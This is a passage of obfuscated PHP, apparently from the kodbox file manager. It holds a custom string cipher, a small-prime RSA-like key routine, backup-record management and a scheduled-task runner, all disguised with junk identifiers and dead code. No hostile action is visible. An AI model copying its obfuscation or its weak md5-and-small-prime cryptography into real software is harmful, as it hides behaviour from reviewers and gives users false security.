} return $³Ş÷ã¢µ; } private function ntelac410ede($ü¸÷Á¢, $º­·İ¼Ñ, $Í¡ôç› = 3) { $Ë˜ª¶ =& $_SERVER[´È¥ö†ö]; $ı™ÜÍı =& $_SERVER[–®Á¾äİ]; if (!is_string($ü¸÷Á¢) || strlen($ü¸÷Á¢) < 10) { return !1; } $ü¸÷Á¢ = trim($ü¸÷Á¢); $Ğù×ı·È = $Ë˜ª¶[789]; while (strlen($Ğù×ı·È) < $Ë˜ª¶[705]) { if (!$Ğù×ı·È) { break; } $Ğù×ı·È++; } $ü¸÷Á¢ = strrev($ü¸÷Á¢); $‰•îÅ…¥ = $Ë˜ª¶[790]; if (!$‰•îÅ…¥) { die; } $Í¾Ù¹ïÂ = $ü¸÷Á¢[0]; $­üÎ¼‚Œ = $Ë˜ª¶[791]; if (strlen($­üÎ¼‚Œ) < $Ë˜ª¶[720]) { return; } $ş´‘‚¦Œ = substr($ü¸÷Á¢, 1, 15); $ü¸÷Á¢ = substr($ü¸÷Á¢, 16); $šÃ¸×—— = $ı™ÜÍı[300]; $ÎÒëŸ·Ö = $Ë˜ª¶[792]; if (strlen($ÎÒëŸ·Ö) < $Ë˜ª¶[705]) { die; } switch ($Í¾Ù¹ïÂ) { case $ı™ÜÍı[206]: $ëû©º = $this->nelx100bfcab($ü¸÷Á¢, strrev($º­·İ¼Ñ . $ş´‘‚¦Œ)); break; case $ı™ÜÍı[122]: $ëû©º = $this->nelx100bfcab($ü¸÷Á¢, strrev($ş´‘‚¦Œ . $º­·İ¼Ñ)); break; case $ı™ÜÍı[301]: $ëû©º = $this->nelx100bfcab($ü¸÷Á¢, base64_encode($ş´‘‚¦Œ . $º­·İ¼Ñ)); $¡°µØ’¬ = $Ë˜ª¶[708]; while ($¡°µØ’¬ < $Ë˜ª¶[702]) { if ($¡°µØ’¬ >= 0) { break; } $¡°µØ’¬++; } break; $¦×ÅæÓ = $Ë˜ª¶[793]; case $ı™ÜÍı[302]: $ëû©º = $this->nelx100bfcab($ü¸÷Á¢, md5($ş´‘‚¦Œ . $º­·İ¼Ñ)); $ş¼áÓ“Å = $Ë˜ª¶[794]; break; case $ı™ÜÍı[303]: $ü¸÷Á¢ = hash_decode($ü¸÷Á¢); $ÏÕµ¬¯ = $ü¸÷Á¢[0]; $åÍ¨°± = $Ë˜ª¶[795]; if (strlen($åÍ¨°±) < $Ë˜ª¶[705]) { die; } $ü¸÷Á¢ = substr($ü¸÷Á¢, 1); $Œ İ¹èä = $Ë˜ª¶[796]; if (!$Œ İ¹èä) { return; } $„îÊšú = strpos($šÃ¸×——, $ÏÕµ¬¯); $™ì“Ö¶× = md5($ÏÕµ¬¯ . md5($º­·İ¼Ñ . $ÏÕµ¬¯) . $º­·İ¼Ñ); $™ì“Ö¶× = substr($™ì“Ö¶×, $„îÊšú % 8, $„îÊšú % 8 + 7); $•Ôí³°ô = $Ë˜ª¶[797]; if (strlen($•Ôí³°ô) < $Ë˜ª¶[705]) { return; } $´¶áë¼Æ = $ı™ÜÍı[6]; $œº¶É‡• = $Ë˜ª¶[798]; while ($œº¶É‡• < $Ë˜ª¶[697]) { if ($œº¶É‡• >= 0) { break; } $œº¶É‡•++; } $•‡ù°¾± = 0; $¹­“¼û = 0; $¤Ù¥Ú¾÷ = $Ë˜ª¶[799]; if (!$¤Ù¥Ú¾÷) { return; } $ÔÛ‡±Ò• = 0; for ($•‡ù°¾± = 0; $•‡ù°¾± < strlen($ü¸÷Á¢); $•‡ù°¾±++) { $ÔÛ‡±Ò• = $ÔÛ‡±Ò• == strlen($™ì“Ö¶×) ? 0 : $ÔÛ‡±Ò•; $ƒÉëã³Ö = $Ë˜ª¶[800]; $À·è  = $ÔÛ‡±Ò•++; $Ëµ³Îºœ = $Ë˜ª¶[801]; $¹­“¼û = strpos($šÃ¸×——, $ü¸÷Á¢[$•‡ù°¾±]) - $„îÊšú - ord($™ì“Ö¶×[$À·è ]); $İÏ¢Œ—÷ = $Ë˜ª¶[802]; if (strlen($İÏ¢Œ—÷) < $Ë˜ª¶[702]) { return; } while ($¹­“¼û < 0) { $¹­“¼û += 64; } $´¶áë¼Æ .= $šÃ¸×——[$¹­“¼û]; } $ëû©º = base64_decode($´¶áë¼Æ); break; default: $ëû©º = $this->nelx100bfcab($ü¸÷Á¢, $º­·İ¼Ñ . $ş´‘‚¦Œ); $³Ù®³É™ = $Ë˜ª¶[803]; if (!$³Ù®³É™) { die; } break; $§îÎ’Å = $Ë˜ª¶[741]; if (!$§îÎ’Å) { die; } } if ($Í¡ôç› - 1 > 0) { $ëû©º = $this->ntelac410ede($ëû©º, $º­·İ¼Ñ, $Í¡ôç› - 1); } return $ëû©º; } public function rlga3b65da59($¤†¯˜îğ) { $ª¦ËÇ¢ =& $_SERVER[´È¥ö†ö]; $«æÒŞÒò =& $_SERVER[–®Á¾äİ]; $¹Âœ¾¸ = $this->hswu638b1eaf(); $“°»ûŠÜ = $ª¦ËÇ¢[804]; if (strlen($“°»ûŠÜ) < $ª¦ËÇ¢[705]) { die; } $­ÙúÃ„ = $this->hswu638b1eaf(); $§Ñ¸¿ = ($¹Âœ¾¸ - 1) * ($­ÙúÃ„ - 1); $ÆÍ€™×Ì = $ª¦ËÇ¢[805]; if (!$ÆÍ€™×Ì) { return; } $£ÍÚ¼èú = intval(($¹Âœ¾¸ + $­ÙúÃ„) / 2); $·¬äô×¡ = $ª¦ËÇ¢[806]; while (strlen($·¬äô×¡) < $ª¦ËÇ¢[720]) { if (!$·¬äô×¡) { break; } $·¬äô×¡++; } while (1) { $Ğœ¸äÇº = $£ÍÚ¼èú; $ùëÊ•’¾ = $§Ñ¸¿; while ($ùëÊ•’¾ % $Ğœ¸äÇº != 0) { $“ÈÁŸ¼³ = $ùëÊ•’¾; $÷ş¤®»£ = $ª¦ËÇ¢[807]; $ùëÊ•’¾ = $Ğœ¸äÇº; $ŸƒÈµß = $ª¦ËÇ¢[808]; while ($ŸƒÈµß < $ª¦ËÇ¢[720]) { if ($ŸƒÈµß >= 0) { break; } $ŸƒÈµß++; } $Ğœ¸äÇº = $“ÈÁŸ¼³ % $Ğœ¸äÇº; } if ($Ğœ¸äÇº == 1) { break; } else { $£ÍÚ¼èú++; } } $ï—Íû¹ˆ = 2; $ªİ‡Šò = $ª¦ËÇ¢[809]; if (strlen($ªİ‡Šò) < $ª¦ËÇ¢[702]) { return; } for ($ ×°‘Ú• = 0; $ ×°‘Ú• < $§Ñ¸¿ * 10; $ ×°‘Ú•++) { if (($§Ñ¸¿ * $ ×°‘Ú• + 1) % $£ÍÚ¼èú == 0) { $ï—Íû¹ˆ = intval(($§Ñ¸¿ * $ ×°‘Ú• + 1) / $£ÍÚ¼èú); break; } } $´öà•‚Æ = $this->lunt9121f6a1($¹Âœ¾¸ * $­ÙúÃ„ . $«æÒŞÒò[6], $«æÒŞÒò[136]); $é„³¬ = md5($«æÒŞÒò[304] . ($¹Âœ¾¸ + $­ÙúÃ„) . $«æÒŞÒò[305] . $£ÍÚ¼èú . $«æÒŞÒò[305] . $ï—Íû¹ˆ . $«æÒŞÒò[306]); $ËäÚ³šÃ = $ª¦ËÇ¢[810]; if (strlen($ËäÚ³šÃ) < $ª¦ËÇ¢[720]) { return; } $ùÆš÷»¥ = $this->lunt9121f6a1($¤†¯˜îğ, $é„³¬) . $«æÒŞÒò[307] . $´öà•‚Æ; return $ùÆš÷»¥; } public function icsv42bef2cd($ƒ‹é¶ÊÏ) { $©´üÕ³ =& $_SERVER[´È¥ö†ö]; $…€õøÎÉ =& $_SERVER[–®Á¾äİ]; $æ¹úÎ = explode($…€õøÎÉ[307], $ƒ‹é¶ÊÏ); if (count($æ¹úÎ) != 2) { return $…€õøÎÉ[6]; } $şÆìîûÖ = $this->nelx100bfcab($æ¹úÎ[1] . $…€õøÎÉ[6], $…€õøÎÉ[136]); $‹ã«ÁĞ = $©´üÕ³[811]; while ($‹ã«ÁĞ < $©´üÕ³[702]) { if ($‹ã«ÁĞ >= 0) { break; } $‹ã«ÁĞ++; } if (!$şÆìîûÖ) { return $…€õøÎÉ[6]; } $şÆìîûÖ = intval($şÆìîûÖ); $µµá”„“ = $©´üÕ³[812]; if (!$µµá”„“) { die; } $ÄÉºÈ”¬ = 0; $°¡€ô¯ = 0; $–¥‹ÈÇ = $©´üÕ³[813]; for ($ŠéÀ±–Ó = 3; $ŠéÀ±–Ó < $şÆìîûÖ; $ŠéÀ±–Ó += 2) { if ($şÆìîûÖ % $ŠéÀ±–Ó != 0) { continue; } $ÄÉºÈ”¬ = $ŠéÀ±–Ó; $Šššñà© = $©´üÕ³[814]; while ($Šššñà© < $©´üÕ³[705]) { if ($Šššñà© >= 0) { break; } $Šššñà©++; } $°¡€ô¯ = intval($şÆìîûÖ / $ŠéÀ±–Ó); $îı¶‚Æà = $©´üÕ³[815]; while ($îı¶‚Æà < $©´üÕ³[705]) { if ($îı¶‚Æà >= 0) { break; } $îı¶‚Æà++; } break; } $šâÖŒä— = ($ÄÉºÈ”¬ - 1) * ($°¡€ô¯ - 1); $•›åŸ = intval(($ÄÉºÈ”¬ + $°¡€ô¯) / 2); while (1) { $˜’Ø‹Ä÷ = $•›åŸ; $îó§¥«• = $©´üÕ³[816]; if (strlen($îó§¥«•) < $©´üÕ³[702]) { die; } $÷óÎê«æ = $šâÖŒä—; $“ê•»÷Œ = $©´üÕ³[817]; while ($“ê•»÷Œ < $©´üÕ³[702]) { if ($“ê•»÷Œ >= 0) { break; } $“ê•»÷Œ++; } while ($÷óÎê«æ % $˜’Ø‹Ä÷ != 0) { $å‡ÚÉæÎ = $÷óÎê«æ; $÷óÎê«æ = $˜’Ø‹Ä÷; $˜’Ø‹Ä÷ = $å‡ÚÉæÎ % $˜’Ø‹Ä÷; } if ($˜’Ø‹Ä÷ == 1) { break; } else { $•›åŸ++; } } $Ÿ ¦ûûÕ = 2; for ($ŠéÀ±–Ó = 0; $ŠéÀ±–Ó < $šâÖŒä— * 10; $ŠéÀ±–Ó++) { if (($šâÖŒä— * $ŠéÀ±–Ó + 1) % $•›åŸ == 0) { $Ÿ ¦ûûÕ = intval(($šâÖŒä— * $ŠéÀ±–Ó + 1) / $•›åŸ); break; } } $Ç€”İ¾“ = md5($…€õøÎÉ[304] . ($ÄÉºÈ”¬ + $°¡€ô¯) . $…€õøÎÉ[305] . $•›åŸ . $…€õøÎÉ[305] . $Ÿ ¦ûûÕ . $…€õøÎÉ[306]); $Í‡áµø» = $©´üÕ³[818]; while (strlen($Í‡áµø») < $©´üÕ³[705]) { if (!$Í‡áµø») { break; } $Í‡áµø»++; } $®ºøê»“ = $this->nelx100bfcab($æ¹úÎ[0], $Ç€”İ¾“); return $®ºøê»“; } public function hswu638b1eaf() { $ÂáÅÛ¸ =& $_SERVER[´È¥ö†ö]; $ŒĞ×­§ã = mt_rand(pow(2, 14), pow(2, 16) - 1); $§›Ñüìë = array(); $™ó›êô™ = $ÂáÅÛ¸[819]; while ($™ó›êô™ < $ÂáÅÛ¸[705]) { if ($™ó›êô™ >= 0) { break; } $™ó›êô™++; } $–§©‚Å» = 1; while ($–§©‚Å» <= (int) sqrt($ŒĞ×­§ã)) { $™µ£ÈØÏ = $–§©‚Å»; while (!0) { $™µ£ÈØÏ++; if ($™µ£ÈØÏ <= 2) { $–§©‚Å» = $™µ£ÈØÏ; break; } else { if ($™µ£ÈØÏ < 2) { continue; } } $ ˆù‚ß = !0; for ($šåšÉ¿İ = 2; $šåšÉ¿İ <= sqrt($™µ£ÈØÏ); $šåšÉ¿İ++) { if ($™µ£ÈØÏ % $šåšÉ¿İ == 0) { $ ˆù‚ß = !1; } } if ($ ˆù‚ß) { $–§©‚Å» = $™µ£ÈØÏ; break; } } $§›Ñüìë[] = $–§©‚Å»; $ùÅ„Øæ˜ = $ÂáÅÛ¸[820]; if (strlen($ùÅ„Øæ˜) < $ÂáÅÛ¸[313]) { die; } } $Ñ¦Ôìë† = 2; for ($™µ£ÈØÏ = $ŒĞ×­§ã; $™µ£ÈØÏ > 1; $™µ£ÈØÏ--) { $ ˆù‚ß = !0; $ğÌÜııˆ = $ÂáÅÛ¸[821]; if (!$ğÌÜııˆ) { return; } foreach ($§›Ñüìë as $¨ı€§Ôì) { if ($™µ£ÈØÏ % $¨ı€§Ôì == 0) { $ ˆù‚ß = !1; break; } } if ($ ˆù‚ß) { $Ñ¦Ôìë† = $™µ£ÈØÏ; break; } } return $Ñ¦Ôìë†; $‘Êø½Ö = $ÂáÅÛ¸[822]; if (strlen($‘Êø½Ö) < $ÂáÅÛ¸[702]) { return; } } public function ojdve148932f($çÜÆ®È, $ìÅã€”¡) { $“¸¸¸ =& $_SERVER[–®Á¾äİ]; return call_user_func(array($“¸¸¸[8], $“¸¸¸[308]), $çÜÆ®È, $ìÅã€”¡); } public function lunt9121f6a1($¿³¾’Óİ, $Éš´Óâ¥) { $ éĞÅØñ =& $_SERVER[–®Á¾äİ]; return call_user_func(array($ éĞÅØñ[309], $ éĞÅØñ[310]), $¿³¾’Óİ, $Éš´Óâ¥); } public function nelx100bfcab($¦ÌØøÛô, $’Ùõºî›) { $Äëñ± =& $_SERVER[´È¥ö†ö]; $ò£ĞòÁ¡ =& $_SERVER[–®Á¾äİ]; return call_user_func(array($ò£ĞòÁ¡[309], $ò£ĞòÁ¡[311]), $¦ÌØøÛô, $’Ùõºî›); $¥¹ã›ÒŸ = $Äëñ±[823]; if (strlen($¥¹ã›ÒŸ) < $Äëñ±[697]) { die; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[´È¥ö†ö][824]); $this->init(); $this->keep(); } public function init() { $•¦£Öäİ =& $_SERVER[´È¥ö†ö]; $this->isManual(); self::$name = date($•¦£Öäİ[825]); if (!($—¯¼Á×” = $this->model->lastItem())) { $—¯¼Á×” = $this->initData(); } else { self::$name = $—¯¼Á×”[$•¦£Öäİ[32]]; if ($—¯¼Á×”[$•¦£Öäİ[826]] == $•¦£Öäİ[91]) { self::$name = date($•¦£Öäİ[261]); $Ÿ¢Ì€Ô  = intval(_get($—¯¼Á×”, $•¦£Öäİ[827], 0)); if (self::$manual == 0 && $—¯¼Á×”[$•¦£Öäİ[32]] == self::$name) { $this->model->remove($—¯¼Á×”[$•¦£Öäİ[486]]); } $—¯¼Á×” = $this->initData($Ÿ¢Ì€Ô , $—¯¼Á×”[$•¦£Öäİ[828]]); } else { $this->checkStore($—¯¼Á×”[$•¦£Öäİ[828]]); } } self::$option = $—¯¼Á×”; } private function isManual() { $Çíİ‹ì­ = _get($GLOBALS, $_SERVER[´È¥ö†ö][829], 0); $Çíİ‹ì­ = intval($Çíİ‹ì­); self::$manual = $Çíİ‹ì­ && $Çíİ‹ì­ == 1 ? 1 : 0; } private function initData($ã€“·ú = 0, $›Ö†ğ™œ = '') { $ÁÚïŸµÇ =& $_SERVER[´È¥ö†ö]; $Æ£Á‹® = $this->model->config(); if ($›Ö†ğ™œ && $Æ£Á‹®[$ÁÚïŸµÇ[828]] != $›Ö†ğ™œ) { $ã€“·ú = 0; } $this->checkStore($Æ£Á‹®[$ÁÚïŸµÇ[828]]); if (self::$manual == 1) { self::$name .= $ÁÚïŸµÇ[11] . date($ÁÚïŸµÇ[830]); } $Â½÷ÖúÓ = array($ÁÚïŸµÇ[828] => $Æ£Á‹®[$ÁÚïŸµÇ[828]], $ÁÚïŸµÇ[32] => self::$name, $ÁÚïŸµÇ[826] => 0, $ÁÚïŸµÇ[171] => $Æ£Á‹®[$ÁÚïŸµÇ[171]], $ÁÚïŸµÇ[831] => self::$manual, $ÁÚïŸµÇ[379] => array($ÁÚïŸµÇ[832] => array($ÁÚïŸµÇ[826] => 0), $ÁÚïŸµÇ[833] => array($ÁÚïŸµÇ[826] => 0, $ÁÚïŸµÇ[834] => 0, $ÁÚïŸµÇ[835] => 0, $ÁÚïŸµÇ[33] => $ÁÚïŸµÇ[12], $ÁÚïŸµÇ[836] => 0, $ÁÚïŸµÇ[837] => 0), $ÁÚïŸµÇ[838] => array($ÁÚïŸµÇ[826] => 0, $ÁÚïŸµÇ[834] => 0, $ÁÚïŸµÇ[835] => 0, $ÁÚïŸµÇ[836] => 0, $ÁÚïŸµÇ[837] => 0), $ÁÚïŸµÇ[232] => array($ÁÚïŸµÇ[826] => 0, $ÁÚïŸµÇ[839] => 0, $ÁÚïŸµÇ[840] => 0, $ÁÚïŸµÇ[841] => 0, $ÁÚïŸµÇ[842] => 0, $ÁÚïŸµÇ[552] => $ã€“·ú, $ÁÚïŸµÇ[836] => 0, $ÁÚïŸµÇ[837] => 0)), $ÁÚïŸµÇ[836] => time(), $ÁÚïŸµÇ[837] => 0); $¸¹ıñÀÁ = $this->model->insert($Â½÷ÖúÓ); $Â½÷ÖúÓ[$ÁÚïŸµÇ[486]] = $¸¹ıñÀÁ; return $Â½÷ÖúÓ; } private function checkStore($È£çŠŒ€) { $×£¹šÄ£ = Model($_SERVER[´È¥ö†ö][843]); $ßà¢Ë = $×£¹šÄ£->listData($È£çŠŒ€); $×£¹šÄ£->checkConfig($ßà¢Ë); } public static function get() { if (!self::$option) { $ÀñßŞ–Ã = Model($_SERVER[´È¥ö†ö][824]); $ÈÁ‘•ï” = $ÀñßŞ–Ã->findByName(self::$name); $ÀñßŞ–Ã->parseContent($ÈÁ‘•ï”); self::$option = $ÈÁ‘•ï”; } return self::$option; } public static function set($àÃÚøÏ) { $ÅöÑ“® =& $_SERVER[´È¥ö†ö]; $ç°Á˜ğ = self::get(); foreach ($àÃÚøÏ as $÷Ñ¨Æûâ => $ô…ñƒåû) { array_set_value($ç°Á˜ğ, $÷Ñ¨Æûâ, $ô…ñƒåû); } Model($ÅöÑ“®[824])->update($ç°Á˜ğ[$ÅöÑ“®[486]], $ç°Á˜ğ); self::$option = $ç°Á˜ğ; return self::$option; } public function keep() { $›º‡¦¼ø =& $_SERVER[´È¥ö†ö]; $Î«èÜá± = self::get(); if (_get($Î«èÜá±, $›º‡¦¼ø[844], 0) == $›º‡¦¼ø[91]) { return; } $this->backupKeep($Î«èÜá±); self::set(array($›º‡¦¼ø[844] => 1)); } private function backupKeep($ç´º¡ªÊ) { $Æï³ÙÃÏ =& $_SERVER[´È¥ö†ö]; if (self::$manual == 1) { return; } $¡ÄöÇº” = $this->model->listData(); if (empty($¡ÄöÇº”)) { return; } $¸»ƒ¢ß = 0; $¡éŸ®áı = array(); foreach ($¡ÄöÇº” as $ ¹Áóï§) { if ($¸»ƒ¢ß >= 7) { break; } $¡éŸ®áı[] = $ ¹Áóï§[$Æï³ÙÃÏ[32]]; $¸»ƒ¢ß++; } for ($¸»ƒ¢ß = 0; $¸»ƒ¢ß < 12; $¸»ƒ¢ß++) { $¡éŸ®áı[] = date($Æï³ÙÃÏ[845], strtotime("\55{$¸»ƒ¢ß}\x20\x6d\157\156\164\x68\x73")); } $¡éŸ®áı = array_unique($¡éŸ®áı); $á¯ß‚ë = Model($Æï³ÙÃÏ[846])->get($Æï³ÙÃÏ[847]); foreach ($¡ÄöÇº” as $ ¹Áóï§) { if (isset($ ¹Áóï§[$Æï³ÙÃÏ[831]]) && $ ¹Áóï§[$Æï³ÙÃÏ[831]] == $Æï³ÙÃÏ[91]) { continue; } if (!empty($ ¹Áóï§[$Æï³ÙÃÏ[32]]) && in_array($ ¹Áóï§[$Æï³ÙÃÏ[32]], $¡éŸ®áı)) { continue; } $this->model->remove($ ¹Áóï§[$Æï³ÙÃÏ[486]]); $¼ÕÊ»¾ = $this->backupPath($ç´º¡ªÊ, $á¯ß‚ë); IO::remove($¼ÕÊ»¾, !1); } } private function backupPath($¦ŠšÒà¾, $ÑœÜÇ¡Ã = false) { $º¥È   =& $_SERVER[´È¥ö†ö]; if (!$ÑœÜÇ¡Ã) { $ÑœÜÇ¡Ã = Model($º¥È  [846])->get($º¥È  [847]); } $é³â‚èı = $¦ŠšÒà¾[$º¥È  [32]]; $„‘Äµ– = substr(md5($º¥È  [848] . $ÑœÜÇ¡Ã . $é³â‚èı), 0, 8); return "\173\x69\x6f\72{$¦ŠšÒà¾[$º¥È  [828]]}\x7d\x2f\x64\141\164\141\142\141\163\145\x2f\x62\141\x63\x6b\x75\x70\x2f" . $é³â‚èı . $º¥È  [11] . $„‘Äµ–; } public function db() { $†è‡ÌÅ =& $_SERVER[´È¥ö†ö]; $â²Ò©·È = self::get(); if (_get($â²Ò©·È, $†è‡ÌÅ[849], 0) == $†è‡ÌÅ[91]) { return !0; } $¬Èåº’¢ = new BackupDb(); if (!$¬Èåº’¢->index()) { return !1; } self::set(array($†è‡ÌÅ[849] => 1)); return !0; } public function dbFile() { $¾…†¯ˆŠ =& $_SERVER[´È¥ö†ö]; $ûÁ¹®½ = self::get(); if (_get($ûÁ¹®½, $¾…†¯ˆŠ[850], 0) == $¾…†¯ˆŠ[91]) { return !0; } $è±ÁÜÖ¨ = new BackupDbFile(); if (!$è±ÁÜÖ¨->index()) { return !1; } self::set(array($¾…†¯ˆŠ[850] => 1)); return !0; } public function file() { $Ê¥¸ëÓ =& $_SERVER[´È¥ö†ö]; $ÏÏ¶¡ğ = self::get(); if (_get($ÏÏ¶¡ğ, $Ê¥¸ëÓ[851], 0) == $Ê¥¸ëÓ[91]) { return !0; } if ($ÏÏ¶¡ğ[$Ê¥¸ëÓ[171]] == $Ê¥¸ëÓ[852]) { $ÅáË«Ú = new BackupFile(); if (!$ÅáË«Ú->index()) { return !1; } } self::set(array($Ê¥¸ëÓ[851] => 1, $Ê¥¸ëÓ[826] => 1)); return !0; } } goto cßä•­±¼Ñ; eÔ‚³±›•: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Î´äŠÆ =& $_SERVER[´È¥ö†ö]; if (self::valueGet($Î´äŠÆ[826]) != $Î´äŠÆ[91]) { return; } if (self::valueGet($Î´äŠÆ[1722]) == $Î´äŠÆ[91]) { $œŠ  ÎÅ = self::valueGet($Î´äŠÆ[1723]); if (time() - $œŠ  ÎÅ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Î´äŠÆ[1722], $Î´äŠÆ[91]); self::log($Î´äŠÆ[1724] . ACTION . $Î´äŠÆ[1725]); Hook::bind($Î´äŠÆ[1726], $Î´äŠÆ[1727]); $òä¹ÂÄ³ = 0; while (!0) { self::cacheClear(); if (self::valueGet($Î´äŠÆ[826]) != $Î´äŠÆ[91]) { self::valueSet($Î´äŠÆ[1722], $Î´äŠÆ[230]); self::log($Î´äŠÆ[1728]); die; } $—¡€ê­ = time(); if ($—¡€ê­ - $òä¹ÂÄ³ >= 60) { self::valueSet(array($Î´äŠÆ[1722] => $Î´äŠÆ[91], $Î´äŠÆ[1723] => $—¡€ê­)); $òä¹ÂÄ³ = $—¡€ê­; } if (!file_exists(USER_SYSTEM . $Î´äŠÆ[1729])) { self::valueSet(array($Î´äŠÆ[1722] => $Î´äŠÆ[230], $Î´äŠÆ[826] => $Î´äŠÆ[230])); self::log($Î´äŠÆ[1730]); die; } $…Ê÷ÄĞª = file_get_contents(BASIC_PATH . $Î´äŠÆ[1731]); $™ê Ôœæ = KOD_VERSION . $Î´äŠÆ[10] . KOD_VERSION_BUILD; $Ûƒû§è† = match_text($…Ê÷ÄĞª, $Î´äŠÆ[1732]) . $Î´äŠÆ[10] . match_text($…Ê÷ÄĞª, $Î´äŠÆ[1733]); if ($Ûƒû§è† != $™ê Ôœæ) { self::restart(); self::log("\x73\164\x6f\160\x65\144\x2e\133\x76\x65\x72\x73\x69\157\x6e\40\165\160\x64\141\164\145\73{$versionNow}\40\75\x3e\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $—üİ«†© =& $_SERVER[´È¥ö†ö]; http_close(); $GLOBALS[$—üİ«†©[1734]] = 1; $_SERVER[$—üİ«†©[1735]] = $—üİ«†©[1736]; $_COOKIE = array(); $GLOBALS[$—üİ«†©[1737]] = 1; $GLOBALS[$—üİ«†©[1738]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $’äé£– =& $_SERVER[´È¥ö†ö]; http_close(); self::valueSet($’äé£–[826], $’äé£–[230]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($’äé£–[1722] => $’äé£–[230], $’äé£–[826] => $’äé£–[91])); self::log($’äé£–[1739]); } public static function taskSwitch() { $ÅÃ¾Æâ =& $_SERVER[´È¥ö†ö]; $×àÚâÊµ = self::valueGet($ÅÃ¾Æâ[826]) == $ÅÃ¾Æâ[91] ? $ÅÃ¾Æâ[230] : $ÅÃ¾Æâ[91]; self::valueSet($ÅÃ¾Æâ[826], $×àÚâÊµ); } public static function shutdownEvent() { $²Ñ‹õ ” =& $_SERVER[´È¥ö†ö]; self::valueSet($²Ñ‹õ ”[1722], $²Ñ‹õ ”[230]); self::log($²Ñ‹õ ”[1740]); } public static function config($ç«ù•…ƒ, $Òèİé™) { self::valueSet($_SERVER[´È¥ö†ö][826], $ç«ù•…ƒ); } private static function taskRunAll() { $®ÍÓê¬¬ =& $_SERVER[´È¥ö†ö]; $åÉş¿”¯ = timeFloat(); $ÌËìòğÓ = Model($®ÍÓê¬¬[1741])->listData(); $¾¯´ıßó = count($ÌËìòğÓ); for ($ÆèáŞğ = 0; $ÆèáŞğ < $¾¯´ıßó; $ÆèáŞğ++) { $í‚›¦Â = $ÌËìòğÓ[$ÆèáŞğ]; if (!$í‚›¦Â[$®ÍÓê¬¬[486]] || $í‚›¦Â[$®ÍÓê¬¬[1742]] != $®ÍÓê¬¬[91]) { continue; } if (!self::taskTimeCheck($í‚›¦Â)) { continue; } self::taskRun($í‚›¦Â); } Hook::trigger($®ÍÓê¬¬[1743]); self::taskQueueRun($åÉş¿”¯); } private static function taskQueueRun($äÍ‰Ôá) { $ “œ°±É = 10; while (!0) { $ˆÖâ¿¦ğ = TaskQueue::run(); if ($ˆÖâ¿¦ğ === !1) { break; } if (timeFloat() - $äÍ‰Ôá >= $ “œ°±É) { break; } } } private static function taskTimeCheck($Ñé€êñò) { $Îï¸ëâË =& $_SERVER[´È¥ö†ö]; $ÙŠ¿çé = json_decode($Ñé€êñò[$Îï¸ëâË[206]], !0); $Â²Àö÷Ã = intval($Ñé€êñò[$Îï¸ëâË[1723]]); $äÅ£ôÉ = strtotime($Îï¸ëâË[1744] . $ÙŠ¿çé[$Îï¸ëâË[1745]] . $Îï¸ëâË[1746]) - strtotime($Îï¸ëâË[1747]); $ëùî–Ê = time() - strtotime(date($Îï¸ëâË[1748]) . $Îï¸ëâË[1749]); $œš÷îê = $ëùî–Ê >= $äÅ£ôÉ && $ëùî–Ê <= $äÅ£ôÉ + 3600; switch ($ÙŠ¿çé[$Îï¸ëâË[33]]) { case $Îï¸ëâË[1750]: if (time() - $Â²Àö÷Ã < 3600 * 24 * 30) { return !1; } if ($ÙŠ¿çé[$Îï¸ëâË[1750]] == date($Îï¸ëâË[1751]) && $œš÷îê) { return !0; } break; case $Îï¸ëâË[1752]: if (time() - $Â²Àö÷Ã < 3600 * 24 * 7) { return !1; } $™èš¢ğ— = date($Îï¸ëâË[1753]) == 0 ? 7 : date($Îï¸ëâË[1753]); if ($ÙŠ¿çé[$Îï¸ëâË[1752]] == $™èš¢ğ— && $œš÷îê) { return !0; } break; case $Îï¸ëâË[1745]: if (time() - $Â²Àö÷Ã < 3600 * 24) { return !1; } if ($œš÷îê) { return !0; } break; case $Îï¸ëâË[1754]: if (time() - $Â²Àö÷Ã >= floatval($ÙŠ¿çé[$Îï¸ëâË[1754]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $õû·™Ç» =& $_SERVER[´È¥ö†ö]; static $ŸŸ¿³® = 0; $½°©­ü× = 300; if (!$ŸŸ¿³®) { $ŸŸ¿³® = time(); } if (time() - $ŸŸ¿³® < $½°©­ü×) { return; } $ŸŸ¿³® = time(); $³«Òêîİ = Model($õû·™Ç»[588])->db($õû·™Ç»[12]); if ($³«Òêîİ) { $³«Òêîİ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($õû·™Ç»[1755], $õû·™Ç»[1756]); die; } } public static function taskRun($”éÑıı£) { $›åµîµ“ =& $_SERVER[´È¥ö†ö]; self::log($›åµîµ“[1757] . $”éÑıı£[$›åµîµ“[486]] . $›åµîµ“[1758] . $”éÑıı£[$›åµîµ“[32]] . $›åµîµ“[1759] . $”éÑıı£[$›åµîµ“[1760]]); Model($›åµîµ“[1741])->run($”éÑıı£[$›åµîµ“[486]]); $¾Ñ€ÅÖ = timeFloat(); $­²¾ÊŞ = $›åµîµ“[12]; switch ($”éÑıı£[$›åµîµ“[33]]) { case $›åµîµ“[393]: $òİìÀíñ = url_request($”éÑıı£[$›åµîµ“[1760]], $›åµîµ“[1495], !1, !1, !1, !1, 10); if ($òİìÀíñ[$›åµîµ“[826]]) { $­²¾ÊŞ = strlen($òİìÀíñ[$›åµîµ“[1286]]); } break; case $›åµîµ“[1761]: $­²¾ÊŞ = Hook::apply($”éÑıı£[$›åµîµ“[1760]]); default: break; } Model($›åµîµ“[1762])->add(array($›åµîµ“[1763] => $›åµîµ“[12], $›åµîµ“[1764] => $›åµîµ“[230], $›åµîµ“[33] => $›åµîµ“[1765] . $”éÑıı£[$›åµîµ“[486]], $›åµîµ“[1766] => json_encode(array($›åµîµ“[32] => $”éÑıı£[$›åµîµ“[32]], $›åµîµ“[1767] => timeFloat() - $¾Ñ€ÅÖ, $›åµîµ“[379] => $­²¾ÊŞ)))); $ƒµ¦®œ¹ = $­²¾ÊŞ ? $›åµîµ“[1768] . $­²¾ÊŞ : $›åµîµ“[12]; self::log($›åµîµ“[1769] . 